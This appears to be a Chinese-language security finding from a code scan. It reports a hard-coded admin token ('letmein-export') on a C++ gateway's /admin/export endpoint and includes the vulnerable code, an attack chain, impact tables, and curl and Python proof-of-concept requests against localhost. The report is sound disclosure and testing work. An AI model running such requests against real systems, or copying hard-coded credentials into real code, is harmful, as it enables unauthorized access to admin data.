# VULN-SEC-FC-001: 管理导出接口硬编码授权令牌，攻击者可直接获取系统敏感信息

**严重性**: Critical | **CWE**: CWE-798 (Use of Hard-coded Credentials) | **置信度**: 85/100
**位置**: `src/file_cache.cpp:22` @ `FileCache::exportSnapshot`

---

## 1. 漏洞细节

`/admin/export` 管理端点的授权机制完全依赖于一个硬编码在源代码中的静态令牌 `"letmein-export"`。该令牌以明文字符串字面量的形式嵌入在 `FileCache::exportSnapshot()` 函数中（`file_cache.cpp:22`），通过简单的字符串比较（`!=`）进行验证。

该漏洞的核心问题包括：

1. **硬编码凭据**: 令牌 `"letmein-export"` 直接写死在源代码中，无法通过配置修改或轮换，必须重新编译才能更换。
2. **唯一授权机制**: 该令牌是 `/admin/export` 端点的唯一访问控制手段，没有会话管理、没有额外的认证层、没有速率限制、没有 IP 白名单。
3. **令牌通过 URL 查询参数传递**: 令牌以 `?token=letmein-export` 的形式出现在 URL 中，会被记录在 Web 服务器访问日志、代理日志、浏览器历史记录中，极大增加泄露风险。
4. **审计日志明文记录令牌**: `main.cpp:72` 处将令牌原文写入审计日志文件（`audit.event("admin", "export", token)`），进一步扩大泄露面。
5. **明文比较**: 使用 `std::string::operator!=` 进行比较，存在时序攻击（Timing Attack）的理论风险。

成功利用此漏洞后，攻击者可获取系统内部敏感信息，包括用户数量、备份状态和数据目录路径。

## 2. 漏洞代码

**文件**: `src/file_cache.cpp` (行 21-31)

```cpp
std::string FileCache::exportSnapshot(const std::string& token) const {
  if (token != "letmein-export") {    // ← 漏洞点：硬编码令牌，明文比较
    return "denied\n";
  }

  std::ostringstream out;
  out << "users=3\n";                 // ← 泄露：用户数量
  out << "last_backup=disabled\n";    // ← 泄露：备份状态
  out << "data_dir=" << baseDir_ << "\n"; // ← 泄露：数据目录路径
  return out.str();
}
```

**文件**: `src/main.cpp` (行 70-74) — 路由注册与令牌提取

```cpp
server.route("GET", "/admin/export", [&](const HttpRequest& request) {
  std::string token = queryValue(request, "token"); // ← 从 URL 查询参数提取令牌
  audit.event("admin", "export", token);            // ← 令牌明文写入审计日志
  return text(200, files.exportSnapshot(token));    // ← 传递给漏洞函数
});
```

**文件**: `src/main.cpp` (行 13-16) — queryValue 辅助函数

```cpp
std::string queryValue(const HttpRequest& request, const std::string& key) {
  auto found = request.query.find(key);
  return found == request.query.end() ? "" : found->second; // ← 无任何输入验证
}
```

**代码分析**：

- `file_cache.cpp:22`：硬编码字符串 `"letmein-export"` 作为授权令牌，是整个端点的唯一安全屏障。任何拥有源码访问权限的人（包括版本控制系统的所有用户）都可以直接获取此令牌。
- `main.cpp:71`：令牌通过 HTTP GET 查询参数传递，这意味着它会出现在 URL 中，被浏览器历史记录、代理服务器日志、Referer 头等多种渠道泄露。
- `main.cpp:72`：审计日志将令牌明文记录，拥有日志文件读取权限的人即可获取有效令牌。
- 整个链路中没有任何输入清洗、速率限制或额外的身份验证步骤。

## 3. 完整攻击链路

```
[入口点] GET /admin/export?token=<value> @ src/main.cpp:70
↓ HTTP GET 请求，token 作为 URL 查询参数传入
[提取参数] queryValue(request, "token") @ src/main.cpp:71
↓ 从 request.query map 中查找 "token" 键，返回其值（无验证）
[审计记录] audit.event("admin", "export", token) @ src/main.cpp:72
↓ 令牌明文写入审计日志（额外泄露风险）
[传递令牌] files.exportSnapshot(token) @ src/main.cpp:73
↓ token 参数传入 FileCache::exportSnapshot()
[漏洞触发] token != "letmein-export" @ src/file_cache.cpp:22
↓ 明文字符串比较，匹配则返回敏感数据
[数据泄露] 返回 users=3, last_backup=disabled, data_dir=data @ src/file_cache.cpp:27-29
```

**链路详细说明**：

1. **入口点** (`main.cpp:70`)：HTTP 服务器注册了 `GET /admin/export` 路由，接受任意网络客户端的请求。无 IP 限制、无前置认证中间件。
2. **参数提取** (`main.cpp:71`)：`queryValue()` 函数直接从 HTTP 请求的查询参数 map 中提取 `token` 值，无任何长度限制、格式验证或编码处理。
3. **审计日志泄露** (`main.cpp:72`)：提取到的令牌被原文写入审计日志文件 `edge-gateway.audit.log`，形成二次泄露渠道。
4. **令牌验证** (`file_cache.cpp:22`)：使用 `std::string::operator!=` 进行明文比较，无时间恒定比较（constant-time comparison），理论上存在时序侧信道攻击风险。
5. **敏感数据返回** (`file_cache.cpp:27-29`)：验证通过后，返回包含系统内部信息的快照数据。

## 4. 攻击场景

**攻击者画像**: 远程未认证攻击者，无需任何系统账号或特殊权限。攻击者可能通过以下途径获取令牌：
- 拥有源码仓库的读取权限（如 Git 仓库泄露、内部人员）
- 获取到审计日志文件的访问权限
- 通过代理服务器或浏览器历史记录截获
- 暴力猜测（令牌 `"letmein-export"` 为常见弱口令模式）

**攻击向量**: 通过 HTTP GET 请求直接访问 `/admin/export` 端点，携带正确的 `token` 查询参数。

**利用难度**: 低

### 攻击步骤

1. **获取令牌**: 攻击者通过源码泄露、日志文件访问或猜测获得令牌 `"letmein-export"`。
2. **构造请求**: 构造 HTTP GET 请求 `GET /admin/export?token=letmein-export`。
3. **发送请求**: 向目标服务器发送请求，无需任何认证头或会话 Cookie。
4. **获取数据**: 服务器返回 HTTP 200 响应，包含系统内部信息（用户数量、备份状态、数据目录路径）。
5. **利用泄露信息**: 利用获取到的数据目录路径等信息，为进一步攻击（如路径遍历、目录枚举）提供情报。

## 5. 攻击条件

| 条件类型   | 要求         | 说明                                                                                     |
| ---------- | ------------ | ---------------------------------------------------------------------------------------- |
| 网络可达性 | 需要网络访问 | 攻击者需要能够访问 HTTP 服务端口（默认 8080），无 IP 白名单限制                           |
| 认证要求   | 无           | 无需任何用户认证，硬编码令牌是唯一授权机制，且令牌可通过多种途径获取                       |
| 配置依赖   | 无           | 漏洞存在于默认配置中，无需特殊配置即可触发                                                |
| 环境依赖   | 无           | 任何操作系统和编译环境均可触发，不依赖特定平台                                            |
| 时序条件   | 无           | 不存在竞态条件，随时可利用                                                                |

## 6. 造成影响

| 影响维度 | 等级 | 说明                                                                                               |
| -------- | ---- | -------------------------------------------------------------------------------------------------- |
| 机密性   | 高   | 泄露系统内部信息（用户数量、备份状态、数据目录路径）；令牌本身通过日志/URL 进一步泄露               |
| 完整性   | 低   | 导出端点本身为只读操作，但泄露的数据目录路径可辅助后续攻击（如路径遍历），间接影响系统完整性         |
| 可用性   | 无   | 漏洞利用不会导致服务中断                                                                           |

**影响范围**: 

- **直接影响**: 系统管理信息泄露，包括用户数量、备份配置状态和数据存储目录路径。
- **间接影响**: 泄露的 `data_dir` 路径可被用于构造路径遍历攻击（结合 `/files` 端点的 `readTextFile` 函数）；令牌的弱口令特性意味着任何获得源码访问权限的人都能立即获取管理端点的完全访问权。
- **横向扩展**: 硬编码凭据模式如果存在于代码库的其他位置，可能导致多个管理端点被攻破。

## 7. PoC (概念验证)

> ⚠️ 以下 PoC 仅供安全测试和验证使用

### PoC 1: 使用 curl 直接利用

```bash
# 仅供安全测试使用 - 验证硬编码令牌漏洞
# 假设目标服务运行在 localhost:8080

# 步骤 1: 使用错误令牌验证拒绝机制
curl -v "http://localhost:8080/admin/export?token=wrong-token"
# 预期响应: "denied"

# 步骤 2: 使用硬编码令牌获取敏感数据
curl -v "http://localhost:8080/admin/export?token=letmein-export"
# 预期响应:
# users=3
# last_backup=disabled
# data_dir=data
```

### PoC 2: Python 自动化验证脚本

```python
#!/usr/bin/env python3
"""
仅供安全测试使用 - VULN-SEC-FC-001 硬编码凭据漏洞验证
"""
import requests
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"
HARDCODED_TOKEN = "letmein-export"

def test_hardcoded_credential():
    endpoint = f"{TARGET}/admin/export"

    # 测试 1: 无令牌访问应被拒绝
    resp = requests.get(endpoint)
    assert "denied" in resp.text, "无令牌请求应被拒绝"
    print(f"[PASS] 无令牌访问被拒绝: {resp.text.strip()}")

    # 测试 2: 错误令牌应被拒绝
    resp = requests.get(endpoint, params={"token": "invalid"})
    assert "denied" in resp.text, "错误令牌请求应被拒绝"
    print(f"[PASS] 错误令牌被拒绝: {resp.text.strip()}")

    # 测试 3: 硬编码令牌应成功获取敏感数据
    resp = requests.get(endpoint, params={"token": HARDCODED_TOKEN})
    assert resp.status_code == 200, f"HTTP 状态码异常: {resp.status_code}"
    assert "users=" in resp.text, "应返回用户信息"
    assert "data_dir=" in resp.text, "应返回数据目录"
    print(f"[VULN] 硬编码令牌验证通过，敏感数据泄露:")
    print(f"       {resp.text.strip()}")

    # 测试 4: 验证令牌通过 URL 传递（日志泄露风险）
    print(f"[WARN] 令牌通过 URL 查询参数传递，将出现在访问日志中")
    print(f"       请求 URL: {resp.url}")

if __name__ == "__main__":
    test_hardcoded_credential()
    print("\n[结论] VULN-SEC-FC-001 硬编码凭据漏洞已确认")
```

**使用说明**:

1. 确保目标服务已启动并监听在指定端口
2. 运行 `curl` 命令或 Python 脚本
3. 观察响应内容：使用正确令牌时应返回系统内部信息

**预期结果**:

- 无令牌或错误令牌请求返回 `"denied"`
- 使用 `"letmein-export"` 令牌时返回包含 `users=3`、`last_backup=disabled`、`data_dir=data` 的敏感信息
- HTTP 响应状态码为 200（而非 401/403），说明服务端未将此视为认证失败

## 8. 验证环境搭建

### 基础环境

- 操作系统: Linux (Ubuntu 20.04+ / Debian 11+ / Alpine 3.14+)
- 编译器: GCC 9+ 或 Clang 10+（支持 C++17）
- 依赖: 标准 C++ 库，无第三方依赖
- 工具: curl 或 Python 3.6+（用于 PoC 验证）

### 构建步骤

```bash
# 进入项目目录
cd /scan/project

# 编译项目（使用项目的构建系统）
# 如果有 Makefile:
make

# 或者手动编译:
g++ -std=c++17 -I include -o edge-gateway src/main.cpp src/file_cache.cpp src/diagnostics.cpp src/user_store.cpp

# 注意：不需要特殊的编译选项来触发此漏洞
# 即使开启了所有安全加固选项（ASLR、Stack Canary、FORTIFY_SOURCE），
# 硬编码凭据漏洞仍然存在，因为这是逻辑层面的安全问题
```

### 运行配置

```bash
# 启动服务（默认端口 8080）
./edge-gateway

# 或指定端口
./edge-gateway 9090

# 确保 data 目录存在（FileCache 初始化需要）
mkdir -p data
```

### 验证步骤

1. 启动目标服务：`./edge-gateway 8080`
2. 验证服务正常：`curl http://localhost:8080/health` → 应返回 `ok`
3. 验证拒绝机制：`curl "http://localhost:8080/admin/export?token=wrong"` → 应返回 `denied`
4. 触发漏洞：`curl "http://localhost:8080/admin/export?token=letmein-export"` → 应返回敏感数据
5. 检查审计日志：`cat edge-gateway.audit.log` → 应看到令牌明文记录

### 预期结果

- 步骤 4 返回 HTTP 200，响应体包含：
  ```
  users=3
  last_backup=disabled
  data_dir=data
  ```
- 审计日志中出现令牌明文 `"letmein-export"`，证实二次泄露风险
- 整个过程无需任何认证凭据或会话 Cookie
